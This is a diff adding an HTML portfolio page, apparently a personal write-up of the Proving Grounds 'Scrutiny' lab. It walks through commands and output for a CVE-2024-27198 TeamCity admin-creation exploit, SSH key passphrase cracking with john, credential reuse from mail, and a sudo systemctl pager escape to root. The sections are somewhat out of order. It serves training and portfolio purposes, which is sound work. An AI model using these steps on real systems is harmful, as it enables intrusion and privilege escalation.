@@ -1,0 +1,405 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="Enumeration methods are utilized to uncover potential vulnerabilities. The lab focuses on exploiting CVE-2024-27198, practicing privilege escalation, and abusing SUDO permissions for unauthorized access. This lab emphasizes understanding and exploiting vulnerabilities to enhance security awareness."><title>Proving Grounds: Scrutiny</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Scrutiny</h1><p>Enumeration methods are utilized to uncover potential vulnerabilities. The lab focuses on exploiting CVE-2024-27198, practicing privilege escalation, and abusing SUDO permissions for unauthorized access. This lab emphasizes understanding and exploiting vulnerabilities to enhance security awareness.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>This lab focuses on exploiting TeamCity 2023.05.4 using CVE-2024-27198 for Remote Code Execution (RCE), extracting SSH keys from Git repositories, and leveraging systemctl misconfigurations for privilege escalation.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Enumeration methods are utilized to uncover potential vulnerabilities. The lab focuses on exploiting CVE-2024-27198, practicing privilege escalation, and abusing SUDO permissions for unauthorized access. This lab emphasizes understanding and exploiting vulnerabilities to enhance security awareness.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Perform enumeration to identify TeamCity running on the subdomain teams.onlyrands.com and determine the version.</li>
+<li>Exploit CVE-2024-27198 to create an administrative user and access the TeamCity dashboard.</li>
+<li>Extract a private SSH key from a commit made by the user marcot, crack the passphrase using ssh2john, and log in as marcot via SSH.</li>
+<li>Explore user mail to discover credentials leaked by a former employee and switch to the briand user in the administration group.</li>
+<li>Exploit CVE-2023-26604 in systemd 245 to execute commands via the systemctl pager and gain a root shell, completing the challenge.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Run the helper or analysis script used in this lab step.
+
+└─$ python3 CVE-2024-27198.py -t http://teams.onlyrands.com -u test123 -p test123
+[+] Version Found:  2023.05.4 (build 129421)
+[+] Server vulnerable, returning HTTP 200
+[+] New user test123 created succesfully! Go to http://teams.onlyrands.com/login.html to login with your new credentials :)</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>## Since there was smtp port open, checking for mails
+
+# Inspect the directory for files relevant to the next step.
+
+marcot@onlyrands:/var/mail$ ls
+bobbyp  danab  edgarm  kathleenw  marcot  matthewa  patriciam  sonjas  susanw  williamw
+# Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat bobbyp 
+cat: bobbyp: Permission denied
+# Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat danab 
+cat: danab: Permission denied
+# Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat edgarm 
+cat: edgarm: Permission denied
+# Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat kathleenw 
+cat: kathleenw: Permission denied
+# Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat marcot 
+From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
+Return-Path: &lt;matthewa@onlyrands.com&gt;
+X-Original-To: marcot@onlyrands.com
+Delivered-To: marcot@onlyrands.com
+Received: by onlyrands.com (Postfix, from userid 1010)
+        id E8D713650; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
+From: matthewa@onlyrands.com
+To: marcot@onlyrands.com
+Subject: Goodbye, best friend
+Date: Fri,  18 Feb 2022 08:43:11 (UTC)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20240607093348.E8D713650@onlyrands.com&gt;
+
+Marco,
+
+Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is &quot;IdealismEngineAshen476&quot; (without the quotation marcot).
+
+I&#39;ve left you a parting gift--your eyes only.
+I&#39;m gonna miss you, pal. Catch you on the flip side.
+
+Sincerely,
+Matthew A.
+
+From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
+Return-Path: &lt;matthewa@onlyrands.com&gt;
+X-Original-To: marcot@onlyrands.com
+Delivered-To: marcot@onlyrands.com
+Received: by onlyrands.com (Postfix, from userid 1010)
+        id F07F4366A; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
+From: matthewa@onlyrands.com
+To: kathleenw@onlyrands.com, marcot@onlyrands.com,
+    matthewa@onlyrands.com, patriciam@onlyrands.com
+Subject: Goodbye!
+Cc: bobbyp@onlyrands.com, danab@onlyrands.com, susanw@onlyrands.com
+Date: Fri,  18 Feb 2022 08:50:03 (UTC)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20240607093348.F07F4366A@onlyrands.com&gt;
+
+Dear randos,
+
+Like most things in life, good things must come to an end. My access has been terminated, so I thought I\&#39;d send you this very last email to say goodbye.
+
+You have been like a family to me for as long as I can remember, and since our we\&#39;re not supposed to communicate outside of work, I hope that maybe one day you will remember me.
+
+Marco, I have faith you will become an excellent leader for the team.
+
+Take care, everyone. Goodbye!
+
+Sincerely,
+Matthew A.
+
+From marcot@onlyrands.com  Fri Jun  7 09:33:49 2024
+Return-Path: &lt;marcot@onlyrands.com&gt;
+X-Original-To: freelancers
+Delivered-To: freelancers@onlyrands.com
+Received: by onlyrands.com (Postfix, from userid 1012)
+        id 0555F367C; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
+From: marcot@onlyrands.com
+To: williamw@onlyrands.com
+Subject: Welcome, new freelancer!
+Cc: operations@onlyrands.com, freelancers@onlyrands.com
+Date: Mon,  21 Feb 2022 09:26:56 (UTC)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20240607093349.0555F367C@onlyrands.com&gt;
+
+Hi William,
+
+Welcome to the team. I just talked to Sonja about giving you a virtual tour of what we do at OnlyRands, so please be ready to go once Kathleen\&#39;s given you the orientation session on how to use TeamCity.
+
+Best,
+Marco T.
+
+From edgarm@onlyrands.com  Fri Jun  7 09:33:49 2024
+Return-Path: &lt;edgarm@onlyrands.com&gt;
+X-Original-To: marcot@onlyrands.com
+Delivered-To: marcot@onlyrands.com
+Received: by onlyrands.com (Postfix, from userid 1001)
+        id 0D5E136A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
+From: edgarm@onlyrands.com
+To: marcot@onlyrands.com
+Subject: Congratulations
+Date: Mon,  21 Feb 2022 11:07:49 (UTC)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20240607093349.0D5E136A0@onlyrands.com&gt;
+
+Hi Marco,
+
+Congratulations on your promotion to department chief. I trust you will have William W. under control, as well as your shameful numbers. Get work done.
+
+Regards,
+Macejkovic
+
+From sonjas@onlyrands.com  Fri Jun  7 09:33:49 2024
+Return-Path: &lt;sonjas@onlyrands.com&gt;
+X-Original-To: marcot@onlyrands.com
+Delivered-To: marcot@onlyrands.com
+Received: by onlyrands.com (Postfix, from userid 1002)
+        id 1C94636A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
+From: sonjas@onlyrands.com
+To: marcot@onlyrands.com
+Subject: FIX YOUR NUMBERS
+Date: Thu,  24 Feb 2022 16:24:51 (UTC)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20240607093349.1C94636A0@onlyrands.com&gt;
+
+Marco,
+
+If you don&#39;t get those numbers up by the end of the quarter, you and your team are going to make up for it in unpaid overtime.
+
+Regards,
+Stamm</code></pre><ul>
+<li>one of the email said <code>Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is &quot;IdealismEngineAshen476&quot; (without the quotation marcot)</code></li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Read the file contents for useful configuration or credential data.
+
+marcot@onlyrands:/var/mail$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+postfix:x:114:119::/var/spool/postfix:/usr/sbin/nologin
+edgarm:x:1001:1001:Edgar Macejkovic,,,:/home/administration/edgarm:/bin/bash
+sonjas:x:1002:1001:Sonja Stamm,,,:/home/administration/sonjas:/bin/bash
+briand:x:1003:1001:Brian Dach,,,:/home/administration/briand:/bin/bash
+bobbyp:x:1004:1002:Bobby Pfannerstill,,,:/home/operations/bobbyp:/usr/bin/bash
+danab:x:1005:1002:Dana Boyer,,,:/home/operations/danab:/usr/sbin/nologin
+susanw:x:1006:1002:Susan Ward,,,:/home/operations/susanw:/usr/bin/bash
+dont:x:1007:1003:Don Tremblay,,,:/home/finance/dont:/usr/bin/bash
+renep:x:1008:1003:Rene Price,,,:/home/finance/renep:/usr/sbin/nologin
+juliuso:x:1009:1003:Julius Olson-Rogahn,,,:/home/finance/juliuso:/usr/bin/bash
+matthewa:x:1010:1004:Matthew Armstrong,,,:/home/freelancers/matthewa:/usr/bin/bash
+patriciam:x:1011:1004:Patricia Morissette,,,:/home/freelancers/patriciam:/usr/bin/bash
+marcot:x:1012:1004:Marco Tillman,,,:/home/freelancers/marcot:/usr/bin/bash
+kathleenw:x:1013:1004:Kathleen Wisoky,,,:/home/freelancers/kathleenw:/usr/bin/bash
+williamw:x:1014:1004:William Walter,,,:/home/freelancers/williamw:/usr/bin/bash
+git:x:1015:1005:Git Server,,,:/srv/git:/bin/bash
+marcot@onlyrands:/var/mail$</code></pre><ul>
+<li>We can see that by Dach, it is briand</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>Password: 
+# Move into the directory needed for the next action.
+
+matthewa@onlyrands:/var/mail$ cd /home/freelancers/ma
+marcot/   matthewa/ 
+# Move into the directory needed for the next action.
+
+matthewa@onlyrands:/var/mail$ cd /home/freelancers/ma
+marcot/   matthewa/ 
+# Move into the directory needed for the next action.
+
+matthewa@onlyrands:/var/mail$ cd /home/freelancers/matthewa/
+# Inspect the directory for files relevant to the next step.
+
+matthewa@onlyrands:~$ ls
+work
+# Inspect the directory for files relevant to the next step.
+
+matthewa@onlyrands:~$ ls -al
+total 44
+drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 .
+drwxrwxr-x+ 7 root     root        4096 Jun  7  2024 ..
+-r--------+ 1 matthewa freelancers  120 Jun  7  2024 .~
+-rw-rwxr--+ 1 matthewa freelancers  220 Jun  7  2024 .bash_logout
+-rw-rwxr--+ 1 matthewa freelancers 3790 Jun  7  2024 .bashrc
+-rw-rw----+ 1 matthewa freelancers  119 Jun  7  2024 .gitconfig
+-rw-rwxr--+ 1 matthewa freelancers  807 Jun  7  2024 .profile
+drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 work
+matthewa@onlyrands:~$</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Inspect the directory for files relevant to the next step.
+
+matthewa@onlyrands:~$ ls -al
+total 44
+drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 .
+drwxrwxr-x+ 7 root     root        4096 Jun  7  2024 ..
+-r--------+ 1 matthewa freelancers  120 Jun  7  2024 .~
+-rw-rwxr--+ 1 matthewa freelancers  220 Jun  7  2024 .bash_logout
+-rw-rwxr--+ 1 matthewa freelancers 3790 Jun  7  2024 .bashrc
+-rw-rw----+ 1 matthewa freelancers  119 Jun  7  2024 .gitconfig
+-rw-rwxr--+ 1 matthewa freelancers  807 Jun  7  2024 .profile
+drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 work
+# Read the file contents for useful configuration or credential data.
+
+matthewa@onlyrands:~$ cat ./.~
+Dach&#39;s password is &quot;RefriedScabbedWasting502&quot;. I saw it once when he had to use my terminal to check TeamCity&#39;s status.
+# Execute the next evidence-gathering step in the authorized lab.
+
+matthewa@onlyrands:~$ su briand
+Password: 
+# Move into the directory needed for the next action.
+
+briand@onlyrands:/home/freelancers/matthewa$ cd /home/administration/briand/
+# Inspect the directory for files relevant to the next step.
+
+briand@onlyrands:~$ ls</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+25/tcp  open   smtp    Postfix smtpd
+| ssl-cert: Subject: commonName=onlyrands.com
+| Subject Alternative Name: DNS:onlyrands.com
+| Not valid before: 2024-06-07T09:33:24
+|_Not valid after:  2034-06-05T09:33:24
+|_ssl-date: TLS randomness does not represent time
+|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp  open   http    nginx 1.18.0 (Ubuntu)
+|_http-title: OnlyRands
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+443/tcp closed https
+Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><ul>
+<li><p>The login page redirects to <code>teams.onlyrands.com</code>, Adding that path into <code>/etc/hosts</code>file</p>
+</li>
+<li><p>The Login page is <code>http://teams.onlyrands.com/login.html</code></p>
+</li>
+<li><p>The above CVE did not work</p>
+</li>
+<li><p>Searching more we found <a href="https://github.com/yoryio/CVE-2024-27198">CVE-2024-27198</a></p>
+</li>
+<li><p>once logged in, checking for the build history and change logs, we found a user uploaded id_rsa and then removed it</p>
+</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Use the recovered credentials to establish a remote session.
+
+└─$ ssh -i id_rsa macrot@192.168.170.91
+hostkeys_find_by_key_hostfile: hostkeys_foreach failed for /home/kali/.ssh/known_hosts2: Permission denied
+The authenticity of host &#39;192.168.170.91 (192.168.170.91)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:bdEzYRpG4k3NkIr03/E2H6ltJRUD52Zi5YA0fkNr/nY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.170.91&#39; (ED25519) to the list of known hosts.
+&#39;** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+macrot@192.168.170.91\&#39;s password:</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>## We do not have the password, lets try to crack it using ssh2john
+(kali㉿kali)-[~/offsec/scrutiny]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ ssh2john id_rsa &gt; sshkey
+                                                                                                                   
+┌──(kali㉿kali)-[~/offsec/scrutiny]
+# Attempt to recover a password from the captured hash material.
+
+└─$ john sshkey --wordlist=/usr/share/wordlists/rockyou.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+cheer            (id_rsa)     
+1g 0:00:00:35 DONE (2026-06-20 18:13) 0.02838g/s 33.60p/s 33.60c/s 33.60C/s 753951..mississippi
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Identify commands that can run with elevated privileges.
+
+briand@onlyrands:~$ sudo -l
+Matching Defaults entries for briand on onlyrands:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User briand may run the following commands on onlyrands:
+    (root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+briand@onlyrands:~$ sudo /usr/bin/systemctl status teamcity-server.service
+● teamcity-server.service - TeamCity Server
+     Loaded: loaded (/lib/systemd/system/teamcity-server.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2024-10-22 14:32:09 UTC; 1 years 7 months ago
+   Main PID: 850 (sh)
+      Tasks: 153 (limit: 2255)
+     Memory: 1.4G
+     CGroup: /system.slice/teamcity-server.service
+             ├─ 850 sh teamcity-server.sh _start_internal
+             ├─ 859 sh /srv/git/software/TeamCity/bin/teamcity-server-restarter.sh run
+             ├─1196 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/srv/git/software/TeamCity/conf/logging.properties -Djava.util.l
+             └─1811 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServer -classpath /srv/git/software/TeamCity/webapps/ROOT/WEB-INF/pl
+
+Oct 22 14:32:09 onlyrands.com systemd[1]: Starting TeamCity Server...
+Oct 22 14:32:09 onlyrands.com teamcity-server.sh[802]: Spawning TeamCity restarter in separate process
+Oct 22 14:32:09 onlyrands.com teamcity-server.sh[802]: TeamCity restarter running with PID 850
+Oct 22 14:32:09 onlyrands.com systemd[1]: Started TeamCity Server.
+!sh
+## whoami
+root
+## locate proof.txt
+sh: 2: locate: not found
+## find / -type f -iname &#39;local.txt&#39; 2&gt;/dev/null  
+/srv/git/local.txt
+## ind / -type f -iname &#39;proof.txt&#39; 2&gt;/dev/null
+## find / -type f -iname &#39;proof.txt&#39; 2&gt;/dev/null
+/root/proof.txt
+## cat /srv/git/local.txt
+7606bebd9bf5f6b008b18c6bc308e10a
+## cat /root/proof.txt
+5457aa38423c96b0b79d49fef2ba9de9
+## debug2: client_check_window_change: changed
+debug2: channel 0: request window-change confirm 0</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
